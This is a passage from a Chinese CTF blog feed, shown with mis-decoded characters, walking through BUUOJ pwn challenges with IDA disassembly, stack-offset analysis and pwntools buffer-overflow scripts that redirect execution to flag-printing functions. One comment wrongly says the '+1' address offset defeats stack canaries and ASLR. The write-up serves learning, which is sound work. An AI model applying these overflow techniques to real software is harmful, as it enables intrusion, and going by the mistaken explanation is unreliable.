class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨æ­¤å‡½æ•°ä¸­ï¼Œ&#x2F;bin&#x2F;shæ˜¯ä¸ªç»å…¸shellï¼Œæ˜¯æˆ‘ä»¬è·å–æ§åˆ¶æƒçš„å…³é”®ã€‚</p><p>åˆ†æå®Œæ¯•ï¼Œå¼€å§‹ç¼–å†™ä»£ç </p><h4 id="3-pythonè„šæœ¬çš„ç¼–å†™"><a href="#3-pythonè„šæœ¬çš„ç¼–å†™" class="headerlink" title="**3.**pythonè„šæœ¬çš„ç¼–å†™"></a>**3.**pythonè„šæœ¬çš„ç¼–å†™</h4><p>åœ¨ubuntuä¸­ä½¿ç”¨vscode</p><p>åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œåˆ›å»ºæ–‡ä»¶1.py</p><p>æ•´ç†åå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#ä½¿ç”¨pwntoolå·¥å…·ï¼Œ*è¡¨ç¤ºè°ƒå…¥æ‰€æœ‰å†…å®¹ã€‚</span></span><br><span class="line"><span class="comment">#åœ¨è¿™ä¹‹å‰éœ€è¦å®‰è£…pwntoolåŒ…ï¼Œä»¥ä¸‹å‡½æ•°åŸºæœ¬éƒ½æ˜¯pwntoolä¸­çš„</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#shé“¾æ¥node4.buuoj.cn:25521é¶æœºã€‚</span></span><br><span class="line"><span class="comment">#æ³¨æ„ä½¿ç”¨ç©ºæ ¼ä½¿ä»£ç ç¾è§‚ï¼Œå¢åŠ ä»£ç å¯è¯»æ€§</span></span><br><span class="line">sh = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25521</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#è´Ÿè½½ï¼Œbè¡¨ç¤ºä½¿ç”¨byteç±»å‹ï¼Œï¼ˆpwntoolsä¸€èˆ¬éƒ½æ˜¯ç”¨byteæ“ä½œï¼‰å°†æ•°ç»„sç”¨15ä¸ªA</span></span><br><span class="line"><span class="comment">#å¡«å……rbpï¼Œ64ä½éœ€è¦8ä¸ªå­—ç¬¦ï¼ˆä¸€ä¸ªå­—ç¬¦8ä½ï¼‰ï¼Œ32ä½éœ€è¦4ä¸ªå­—ç¬¦</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">15</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span> + p64(<span class="number">0x401186</span>+<span class="number">1</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p64å‡½æ•°è¡¨ç¤ºè½¬åŒ–ä¸ºå…­åå››ä½byteï¼Œè€Œæ‹¬å·é‡Œæ˜¯funå‡½æ•°çš„åœ°å€ï¼ˆIDAè§†å›¾æœ‰æ³¨é‡Šï¼‰</span></span><br><span class="line"><span class="string">+1æ˜¯ä¸ºäº†ç»•è¿‡ä¸€äº›å®‰å…¨æœºåˆ¶ï¼Œå¦‚æ ˆæº¢å‡ºä¿æŠ¤ï¼ˆStack Canariesï¼‰æˆ–åœ°å€ç©ºé—´å¸ƒå±€éšæœºåŒ–ï¼ˆASLRï¼‰ã€‚</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">å½“ ASLR æœºåˆ¶å¼€å¯æ—¶ï¼Œç³»ç»Ÿä¼šå°†å‡½æ•°çš„åœ°å€éšæœºåŒ–ï¼Œä½¿å¾—æ”»å‡»è€…å¾ˆéš¾å‡†ç¡®é¢„æµ‹å‡½æ•°åœ°å€çš„ä½ç½®ã€‚é€šè¿‡åœ¨è¿”å›åœ°å€ä¸­åŠ ä¸Šä¸€ä¸ªå¸¸æ•°ï¼ˆå¦‚ +1ï¼‰ï¼Œæ”»å‡»è€…å¯ä»¥è¯•å›¾ç»•è¿‡éšæœºåŒ–ï¼Œä½¿æ”»å‡»æ›´åŠ ç¨³å®šã€‚</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#å‘é€å‡½æ•°</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#æš‚åœå¹¶è¿›å…¥äº¤äº’çš„å‡½æ•°</span></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¦å¤–ï¼Œå¦‚æœæ˜¯æ‰§ç€äºæœ¬åœ°è°ƒè¯•ï¼Œæˆ‘ä»¬å¯ä»¥è¿™æ ·ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># Connect to the process</span></span><br><span class="line">r = process(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Offset calculation</span></span><br><span class="line"><span class="comment">#rbpæœ«å°¾-ï¼ˆrsp+1ï¼‰ï¼Œå…¶ä¸­rsp+1æ˜¯å‚æ•°èµ·å§‹ä½ç½®ã€‚</span></span><br><span class="line"><span class="comment">#RSPä»£è¡¨â€œæ³¨å†Œå †æ ˆæŒ‡é’ˆï¼ŒRBPä»£è¡¨â€œæ³¨å†ŒåŸºæŒ‡é’ˆâ€ã€‚</span></span><br><span class="line">offset = <span class="number">0x7fffffffe7a8</span> - <span class="number">0x7fffffffe791</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Function address</span></span><br><span class="line">fun = <span class="number">0x0000000000401186</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Construct the payload</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * offset + p64(fun)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Send the payload</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Interact with the process</span></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ³¨ï¼š</p><ol><li>**RSP (Stack Pointer)**ï¼š<ul><li>æ€»æ˜¯æŒ‡å‘æ ˆçš„é¡¶éƒ¨ã€‚</li><li>æ¯æ¬¡è°ƒç”¨å‡½æ•°ã€å‹å…¥æ•°æ®æˆ–å…¶ä»–éœ€è¦ä½¿ç”¨æ ˆçš„æ“ä½œæ—¶ï¼Œ<code>RSP</code>éƒ½ä¼šç›¸åº”åœ°è°ƒæ•´ã€‚</li><li>ä¾‹å¦‚ï¼Œæ¯æ¬¡æ‰§è¡Œ<code>PUSH</code>æŒ‡ä»¤ï¼Œ<code>RSP</code>éƒ½ä¼šå‡å»æ‰€éœ€çš„å­—èŠ‚æ•°ï¼ˆåœ¨x86_64ä¸­é€šå¸¸æ˜¯8å­—èŠ‚ï¼‰ï¼Œå› ä¸ºæ ˆåœ¨ä½åœ°å€æ–¹å‘ä¸Šå¢é•¿ã€‚</li></ul></li><li>**RBP (Base Pointer)**ï¼š<ul><li>ç”¨ä½œå¸§æŒ‡é’ˆï¼Œåœ¨å‡½æ•°è°ƒç”¨ä¸­ï¼Œå®ƒå¸¸å¸¸ç”¨æ¥ä½œä¸ºå½“å‰å‡½æ•°çš„å±€éƒ¨å˜é‡å’Œå‚æ•°çš„åŸºå‡†ç‚¹ã€‚</li><li>åœ¨å‡½æ•°è°ƒç”¨çš„å¼€å¤´ï¼Œé€šå¸¸ä¼šçœ‹åˆ°<code>RBP</code>è¢«è®¾ç½®ä¸º<code>RSP</code>çš„å½“å‰å€¼ï¼Œè¿™æ ‡å¿—ç€å‡½æ•°çš„å¼€å§‹ã€‚</li><li>ä½¿ç”¨åŸºæŒ‡é’ˆå¯ä»¥æ›´å®¹æ˜“åœ°è®¿é—®å‡½æ•°çš„å±€éƒ¨å˜é‡å’Œå‚æ•°ï¼Œå› ä¸ºå®ƒä»¬é€šå¸¸éƒ½æ˜¯åŸºäº<code>RBP</code>çš„å›ºå®šåç§»ã€‚</li></ul></li></ol><h4 id="4-è·å–flag"><a href="#4-è·å–flag" class="headerlink" title="**4.**è·å–flag"></a>**4.**è·å–flag</h4><p>è¾“å…¥lsï¼Œå‘ç°flagï¼Œè¾“å…¥cat flagï¼Œå®Œæˆflagçš„è·å–ã€‚</p><h2 id="warmup-csaw-2016-1"><a href="#warmup-csaw-2016-1" class="headerlink" title="warmup_csaw_2016  1"></a>warmup_csaw_2016  1</h2><p>20230825</p><p>è¿™ä¸€é¢˜ä¸ä¸Šä¸€é¢˜å¾ˆåƒã€‚</p><h4 id="1-å°è¯•ï¼š"><a href="#1-å°è¯•ï¼š" class="headerlink" title="1.å°è¯•ï¼š"></a>1.å°è¯•ï¼š</h4><p>åœ¨ubuntuä¸­ï¼Œchecksecï¼Œæ‹–å…¥terminaläº¤äº’å°è¯•ï¼Œ</p><h4 id="2-åˆ†æï¼š"><a href="#2-åˆ†æï¼š" class="headerlink" title="2.åˆ†æï¼š"></a>2.åˆ†æï¼š</h4><p>åœ¨windowsä¸­ï¼Œæ‹–å…¥IDAï¼ŒF5è¿›å…¥mainå‡½æ•°ä¼ªä»£ç ã€‚</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">64</span>]; <span class="comment">// [rsp+40h] [rbp-40h] BYREF</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;-Warm Up-\n&quot;</span>, <span class="number">0xA</span>uLL);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;WOW:&quot;</span>, <span class="number">4uLL</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">&quot;%p\n&quot;</span>, sub_40060D);</span><br><span class="line">  write(<span class="number">1</span>, s, <span class="number">9uLL</span>);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;&gt;&quot;</span>, <span class="number">1uLL</span>);</span><br><span class="line">  <span class="keyword">return</span> gets(v5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œsæ•°ç»„çš„å®šä¹‰åé¢æ ‡æ³¨äº†rspæ˜¯0hå¼€å§‹ã€‚</p><p>å¯ä»¥çªç ´çš„ç‚¹ç…§æ ·æ˜¯gets()ï¼Œåªä¸è¿‡è¿™æ¬¡æ˜¯åœ¨returnã€‚</p><p>ç‚¹å…¥å‡½æ•°sub_40060DæŸ¥çœ‹ï¼Œå®ƒåœ¨æ§åˆ¶å°æ‰§è¡Œäº†è¾“å‡ºflagçš„å‘½ä»¤ï¼Œè¿™è‚¯å®šæ˜¯å…³é”®ã€‚</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_40060D</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;cat flag.txt&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼Œè¿™ä¸ªå‡½æ•°çš„åç§°ä¹Ÿåœ¨ä»£è¡¨ä»–çš„åœ°å€ï¼š0x40060Dã€‚</p><p>å¦å¤–å°è¯•ç†è§£è¿™ä¸€å¥ï¼Œå¯ä»¥é—®é—®chatGPTï¼Œä½œç”¨æ˜¯å°†sub_40060Dçš„åœ°å€å†™åˆ°å­—ç¬¦ä¸²sã€‚</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sprintf</span>(s, <span class="string">&quot;%p\n&quot;</span>, sub_40060D);</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹å˜é‡v5ï¼Œ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-0000000000000040 var_40          db 64 dup(?)</span><br></pre></td></tr></table></figure><p>var_40ï¼Œå¯ä»¥çŸ¥é“å®ƒå ä½40hï¼Œä¹Ÿå¯ä»¥çœ‹åé¢åè¿›åˆ¶æ˜¯64ä½ã€‚</p><p>å¦å¤–ï¼Œvarä»£è¡¨variableï¼Œå¤šå˜çš„ï¼Œä¸€èˆ¬è¡¨ç¤ºå˜é‡ã€‚</p><h4 id="3-æ”»å‡»"><a href="#3-æ”»å‡»" class="headerlink" title="3.æ”»å‡»"></a>3.æ”»å‡»</h4><p>ubuntuä¸­æ‰“å¼€terminalï¼Œè¾“å…¥codeï¼Œæ‰“å¼€vscodeã€‚</p><p>å¯ä»¥åˆ©ç”¨ä¸Šé¢˜çš„ä»£ç ç¨ä½œä¿®æ”¹ï¼Œç»å…¸äº”è¡Œã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29678</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#64è¡¨ç¤ºv5å ç”¨çš„ç©ºé—´ï¼Œ8è¡¨ç¤ºrbpåœ¨64ä½ä¸­å 8ä½ã€‚æœ€åçš„è½¬åˆ°å‡½æ•°sub_40060Dçš„åœ°å€ã€‚</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">64</span> + <span class="number">8</span>)+ p64(<span class="number">0x40060D</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>è¾“å‡ºå¦‚ä¸‹ã€‚</p><blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">&gt;-Warm Up-</span><br><span class="line">&gt;WOW:0x40060d</span><br><span class="line"></span><br><span class="line">&gt;&gt;flag&#123;bf2fb88a-c858-488b-ab42-50fe90c44d60&#125;</span><br><span class="line">&gt;&gt;timeout: the monitored command dumped core</span><br><span class="line">&gt;&gt;[*] Got EOF while reading in interactive</span><br></pre></td></tr></table></figure></blockquote><h2 id="ciscn-2019-n-1-1"><a href="#ciscn-2019-n-1-1" class="headerlink" title="ciscn_2019_n_1  1"></a>ciscn_2019_n_1  1</h2><p>0825</p><p>è¿™æ¬¡æˆ‘ä»¬çœç•¥ä¸€äº›ä½œç”¨ä¸å¤ªå¤§çš„æµæ°´çº¿æ“ä½œï¼Œç›´æ¥è¿›å…¥IDAåˆ†æ</p><h4 id="1-åˆ†æå‡½æ•°"><a href="#1-åˆ†æå‡½æ•°" class="headerlink" title="1.åˆ†æå‡½æ•°"></a>1.åˆ†æå‡½æ•°</h4><p>IDAæ‰“å¼€æ–‡ä»¶ï¼Œè¿›å…¥mainå‡½æ•°ï¼Œå‘ç°æœ‰ä¸€ä¸ªfunc()å‡½æ•°å¼•èµ·äº†æˆ‘ä»¬çš„æ³¨æ„ã€‚</p><p>åœ¨funcå‡½æ•°ä¸­ï¼Œæˆ‘ä»¬æ³¨æ„åˆ°return system(â€œcat &#x2F;flagâ€);æ˜¯æˆ‘ä»¬æ‰€éœ€è¦çš„ï¼Œ</p><p>è€Œgetså‡½æ•°æ­£ä¸­æˆ‘ä»¬æº¢å‡ºæ”»å‡»çš„ä¸‹æ€€ã€‚</p><p>äºæ˜¯æ€è·¯å‡ºç°ï¼š</p><p>ä½¿v2å˜æˆæµ®ç‚¹æ•°11.28125ï¼Œæ¥æ‰§è¡Œreturn system(â€œcat &#x2F;flagâ€);</p><p>æˆ–</p><p>ç›´æ¥æº¢å‡ºä½¿return system(â€œcat &#x2F;flagâ€);æ‰§è¡Œ</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">44</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">float</span> v2; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">0.0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Let&#x27;s guess the number.&quot;</span>);</span><br><span class="line">  gets(v1);</span><br><span class="line">  <span class="keyword">if</span> ( v2 == <span class="number">11.28125</span> )</span><br><span class="line">    <span class="keyword">return</span> system(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Its value should be 11.28125&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-åˆ†æå˜é‡"><a href="#2-åˆ†æå˜é‡" class="headerlink" title="2.åˆ†æå˜é‡"></a>2.åˆ†æå˜é‡</h4><p>åŒå‡»v1ï¼Œæˆ‘ä»¬ä¼šçœ‹åˆ°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-0000000000000030 ; D/A/*   : change type (data/ascii/array)</span><br><span class="line">-0000000000000030 ; N       : rename</span><br><span class="line">-0000000000000030 ; U       : undefine</span><br><span class="line">-0000000000000030 ; Use data definition commands to create local variables and function arguments.</span><br><span class="line">-0000000000000030 ; Two special fields &quot; r&quot; and &quot; s&quot; represent return address and saved registers.</span><br><span class="line">-0000000000000030 ; Frame size: 30; Saved regs: 8; Purge: 0</span><br><span class="line">-0000000000000030 ;</span><br><span class="line">-0000000000000030</span><br><span class="line">-0000000000000030 var_30          db 44 dup(?)</span><br><span class="line">-0000000000000004 var_4           dd ?</span><br><span class="line">+0000000000000000  s              db 8 dup(?)</span><br><span class="line">+0000000000000008  r              db 8 dup(?)</span><br><span class="line">+0000000000000010</span><br><span class="line">+0000000000000010 ; end of stack variables</span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼šåœ¨æ±‡ç¼–è¯­è¨€ä¸­ï¼Œ<code>db</code> æ˜¯ â€œdefine byteâ€ çš„ç¼©å†™ï¼Œç”¨äºå®šä¹‰ä¸€ä¸ªæˆ–å¤šä¸ªå­—èŠ‚çš„æ•°æ®ã€‚</p><p><code>dup</code> æ˜¯ â€œduplicateâ€ çš„ç¼©å†™ï¼Œå¸¸ç”¨äºæ±‡ç¼–è¯­è¨€ä¸­è¡¨ç¤ºé‡å¤æŸä¸ªå€¼å¤šæ¬¡ã€‚</p><p><code>dd</code> æ˜¯ â€œdefine doublewordâ€ çš„ç¼©å†™ã€‚ä¸€ä¸ªdoublewordé€šå¸¸è¡¨ç¤º4å­—èŠ‚ï¼ˆæˆ–32ä½ï¼‰çš„æ•°æ®ã€‚</p><p>é—®å·è¡¨ç¤ºæ¯ä¸ªå­—èŠ‚çš„å€¼æ˜¯æœªæŒ‡å®šçš„ã€‚</p><p>æ˜¾ç¤ºçš„é˜´å½±éƒ¨åˆ†åœ¨var_30ï¼Œè€Œä¸‹ä¸€ä¸ªå˜é‡v2åœ¨var_4ä½ç½®</p><p>å³v1æ•°ç»„ä»30hå¼€å§‹ï¼Œåˆ°4hã€‚</p><p>30h-4h&#x3D;2Bh&#x3D;44bï¼Œåˆšå¥½æ˜¯åé¢çš„44bã€‚</p><p>å³ï¼Œv1å äº†44ä½ï¼Œè€Œv2å äº†4ä½ã€‚</p><p>å‰©ä¸‹çš„â€œsâ€å³rbpï¼Œå 8ä½</p><p>â€œrâ€ä¸ºreturnï¼Œå 8ä½ã€‚</p><h4 id="3-ç¼–å†™è„šæœ¬"><a href="#3-ç¼–å†™è„šæœ¬" class="headerlink" title="3.ç¼–å†™è„šæœ¬"></a>3.ç¼–å†™è„šæœ¬</h4><p>ç¬¬ä¸€ç§æ–¹æ³•ï¼šä½¿v2å˜æˆæµ®ç‚¹æ•°11.28125ï¼Œæ¥æ‰§è¡Œreturn system(â€œcat &#x2F;flagâ€);</p><p>å¡«æ»¡v1ä¹‹åå°±æ˜¯v2äº†ï¼Œç›´æ¥è¦æ±‚çš„æ•°å­—ï¼Œæ»¡è¶³ <strong>v2 &#x3D;&#x3D; 11.28125</strong> çš„åˆ¤æ–­å¼</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25580</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">44</span> +  p64(<span class="number">0x41348000</span>)</span><br><span class="line"><span class="comment">#11.28125=0x41348000</span></span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒç§æ–¹æ³•ï¼šç›´æ¥æº¢å‡ºä½¿return system(â€œcat &#x2F;flagâ€);æ‰§è¡Œ</p><p>åœ¨funcå‡½æ•°è§†å›¾å•å‡»ç©ºæ ¼ï¼Œä¼šå‡ºç°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000004006BE                 mov     edi, offset command ; &quot;cat /flag&quot;</span><br><span class="line">.text:00000000004006C3                 mov     eax, 0</span><br><span class="line">.text:00000000004006C8                 call    _system</span><br><span class="line">.text:00000000004006CD                 jmp     short loc_4006D9</span><br></pre></td></tr></table></figure><p>æ³¨æ„æ­¤å¤„çš„00000000004006BEåœ°å€ï¼Œå°±æ˜¯æˆ‘ä»¬è¦çš„è¿”å›åœ°å€ã€‚</p><p>åˆ†å·åé¢æœ‰ä¸€å¥ â€œcat &#x2F;flagâ€ï¼Œè¿™æ˜¯æ³¨é‡Šï¼Œè¯´æ˜æ‰§è¡Œè¿™ä¸€å¥ã€‚</p><p>æ³¨ï¼š</p><p>1.åœ¨ x86_64 æ¶æ„ä¸­çš„ calling conventionï¼Œ<code>EDI</code> å¯„å­˜å™¨ï¼ˆæˆ–å…¶64ä½ç‰ˆæœ¬ <code>RDI</code>ï¼‰ç»å¸¸ç”¨äºä¼ é€’å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°ã€‚</p><p>2.åœ¨ x86_64 æ¶æ„ä¸­ï¼Œå½“è°ƒç”¨æŸäº›å‡½æ•°æ—¶ï¼Œ<code>EAX</code> å¯„å­˜å™¨ç”¨äºæŒ‡ç¤ºè¦ä½¿ç”¨çš„å‚æ•°æ•°é‡ï¼Œç‰¹åˆ«æ˜¯å˜é•¿å‚æ•°çš„å‡½æ•°ã€‚åœ¨è¿™ç§æƒ…å¢ƒä¸‹ï¼Œè¿™è¡Œä»£ç å¯èƒ½æ˜¯ä¸ºäº†å‘Šè¯‰ç³»ç»Ÿå‡½æ•° â€œ_systemâ€ ä¸å¸¦é¢å¤–çš„å‚æ•°ã€‚</p><p>3.<strong>call    _system</strong>è°ƒç”¨äº†systemå‡½æ•°ï¼Œç”¨äºæ‰§è¡Œå‘½ä»¤ã€‚</p><p>4.<strong>jmp     short loc_4006D9</strong>è¡¨ç¤ºè°ƒåˆ°æŸåœ°å€ï¼Œæˆ‘ä»¬åŒå‡»å®ƒï¼Œå¯æ¥åˆ°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000004006D9 loc_4006D9:                             ; CODE XREF: func+57â†‘j</span><br><span class="line">.text:00000000004006D9                 nop</span><br><span class="line">.text:00000000004006DA                 leave</span><br><span class="line">.text:00000000004006DB                 retn</span><br></pre></td></tr></table></figure><p>è¿™ä¸‰ä¸ªæŒ‡ä»¤é€šå¸¸å‡ºç°åœ¨å‡½æ•°çš„ç»“å°¾ã€‚è®©æˆ‘ä»¬é€ä¸€è§£é‡Šå®ƒä»¬çš„ä½œç”¨ï¼š</p><ol><li><p><code>.text:00000000004006D9 nop</code></p><p><code>nop</code> æŒ‡ä»¤æ˜¯ â€œNo Operationâ€ çš„ç¼©å†™ï¼Œæ„å‘³ç€å®ƒä¸æ‰§è¡Œä»»ä½•æ“ä½œã€‚å®ƒçš„ä¸»è¦ç”¨é€”æ˜¯ä¸ºäº†ä»£ç å¯¹é½æˆ–åœ¨äºŒè¿›åˆ¶ä¸­å¡«å……ç©ºé—´ã€‚æœ‰æ—¶ï¼Œ<code>nop</code> ä¹Ÿåœ¨è°ƒè¯•æˆ–åˆ†ææ—¶è¢«ä½¿ç”¨ï¼Œå› ä¸ºä½ å¯ä»¥å®‰å…¨åœ°æ›¿æ¢å®ƒè€Œä¸æ”¹å˜ç¨‹åºçš„åŠŸèƒ½ã€‚</p></li><li><p><code>.text:00000000004006DA leave</code></p><p><code>leave</code> æŒ‡ä»¤æ˜¯å‡½æ•°ç»“æŸæ—¶å¸¸è§çš„æŒ‡ä»¤ï¼Œå®ƒæ‰§è¡Œä¸¤ä¸ªä¸»è¦æ“ä½œï¼š</p><ul><li>å°† <code>RBP</code> å¯„å­˜å™¨çš„å€¼åŠ è½½åˆ° <code>RSP</code> å¯„å­˜å™¨ã€‚è¿™å°†å †æ ˆæŒ‡é’ˆ <code>RSP</code> é‡ç½®ä¸ºå®ƒåœ¨å‡½æ•°å…¥å£æ—¶çš„ä½ç½®ã€‚</li><li>ä¹‹åï¼Œå®ƒä»å †æ ˆä¸­å¼¹å‡ºä¸€ä¸ªå€¼åˆ° <code>RBP</code> å¯„å­˜å™¨ã€‚è¿™æ¢å¤äº†è°ƒç”¨å‡½æ•°æ—¶ <code>RBP</code> å¯„å­˜å™¨çš„åŸå§‹å€¼ã€‚</li></ul><p>æ€»çš„æ¥è¯´ï¼Œè¿™å®é™…ä¸Šæ˜¯ <code>mov rsp, rbp</code> å’Œ <code>pop rbp</code> ä¸¤ä¸ªæŒ‡ä»¤çš„ç»„åˆã€‚</p></li><li><p><code>.text:00000000004006DB retn</code></p><p><code>retn</code> æŒ‡ä»¤ä»å †æ ˆä¸­å¼¹å‡ºä¸€ä¸ªè¿”å›åœ°å€å¹¶è·³è½¬åˆ°é‚£ä¸ªåœ°å€ï¼Œè¿™ç»“æŸäº†å½“å‰çš„å‡½æ•°è°ƒç”¨ï¼Œç¨‹åºçš„æ§åˆ¶æƒè¿”å›åˆ°è°ƒç”¨æ­¤å‡½æ•°çš„ä»£ç ã€‚åœ¨ x86 æ¶æ„ä¸­ï¼Œ<code>retn</code> å’Œ <code>ret</code> æ˜¯ç­‰ä»·çš„ã€‚</p></li></ol><p>ç»“åˆèµ·æ¥çœ‹ï¼Œè¿™äº›æŒ‡ä»¤åœ¨å‡½æ•°ç»“æŸæ—¶æ¢å¤äº†åŸå§‹çš„å †æ ˆå’Œå¸§æŒ‡é’ˆï¼Œå¹¶è¿”å›åˆ°è°ƒç”¨æ­¤å‡½æ•°çš„åœ°æ–¹ã€‚</p><p>pythonè„šæœ¬ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25580</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">44</span> + <span class="number">4</span> + <span class="number">8</span>)  +  p64(<span class="number">0x4006BE</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">æŒ‰é¡ºåºå¡«æ»¡v1ï¼Œv2ï¼Œrbpï¼Œåˆ†åˆ«ä¸º44 , 4 ,8ä½ã€‚</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">æœ€åæŠŠè¿”å›åœ°å€ç”¨0x4006BEè¦†ç›–ï¼Œæ‰§è¡Œcat /flag</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      
      <category domain="https://cjliblog.top/tags/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/">CTFåšé¢˜è®°å½•</category>
      
      
      <comments>https://cjliblog.top/2023/08/25/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%201/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>NC16593é“ºåœ°æ¯¯</title>
      <link>https://cjliblog.top/2023/08/13/NC16593%E9%93%BA%E5%9C%B0%E6%AF%AF/</link>
      <guid>https://cjliblog.top/2023/08/13/NC16593%E9%93%BA%E5%9C%B0%E6%AF%AF/</guid>
      <pubDate>Sat, 12 Aug 2023 16:00:00 GMT</pubDate>
      
      <description>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯description</description>
      
      
      
